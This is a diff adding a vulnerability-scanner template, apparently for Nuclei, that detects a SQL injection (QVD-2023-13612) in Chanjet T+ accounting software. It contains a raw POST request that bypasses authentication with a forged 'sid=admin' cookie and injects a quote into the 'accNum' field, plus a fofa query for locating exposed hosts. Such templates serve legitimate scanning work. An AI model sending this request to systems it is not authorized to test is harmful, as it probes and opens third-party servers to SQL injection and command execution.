@@ -1,0 +1,25 @@
+id: T+ front_sql
+info:
+  name: 畅捷通T+_front_sql(QVD-2023-13612)
+  author: mike
+  severity: info
+  description: 畅捷通T+的某后台功能点只校验了权限，未对用户的输入进行过滤，导致在权限绕过后存在SQL注入漏洞，利用此漏洞攻击者最终可以实现远程命令执行。
+  reference: https://www.cnblogs.com/pursue-security/p/17684691.html
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="畅捷通-TPlus"
+http:
+  - raw:
+      - |
+        POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+        Cookie: ASP.NET_SessionId=; sid=admin
+
+        {"accNum": "6'", "functionTag": "SYS0104", "url": ""}
+    matchers:
+      - type: word
+        words:
+          - "附近有语法错误"
+        part: body
